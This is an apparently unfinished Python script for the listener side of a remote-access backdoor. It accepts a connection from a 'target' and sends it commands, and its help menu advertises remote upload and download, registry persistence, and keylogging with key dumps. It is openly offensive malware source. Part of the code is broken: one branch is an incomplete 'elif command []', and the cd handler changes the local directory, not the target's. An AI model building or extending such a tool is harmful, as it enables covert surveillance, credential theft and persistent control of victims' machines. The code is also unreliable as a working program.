import socket
from termcolor import *
import json
import os




def reliable_send(data):
    json_data = json.dumps(data)
    target.send(json_data.encode())



def target_communication():
    while True:

        command = str(input('USER@User~#%s ' % str(ip)))
        reliable_send(command)
        if command == 'quit':
            break
        elif command == 'help':
            print(colored('''\n
            quit                        --> Quit the session.
            help                        --> Help menu.
            cd *Directory_name          --> Change the directory on the target.
            upload *file_name           --> Upload the file to the target.
            download *file_name         --> Download the file from the target.
            persistance *reg_dir *file  --> Create Persistance.
            start_keylogger             --> Start the keylogger for capturing the keystroks.
            stop_keylogger              --> Stop capturing the keystroks.
            dump_keys                   --> Dump the keystroks.
            clear                       --> Clear the terminal.

            
            
            '''))

        elif command[:3] == 'cd ':
            os.chdir(command[3:])
        elif command []
        # result = target.recv()
        # print(result)
        # msg = target.recv(1024)
        # print(msg.decode())

sock =socket.socket(socket.AF_INET,socket.SOCK_STREAM)
sock.bind(('127.0.0.1',5555))
print(colored('[+]Listening...','green'))
sock.listen(5)
target, ip = sock.accept()
print(colored('(*)--> Connection from :'+ str(ip), 'green'))
target_communication()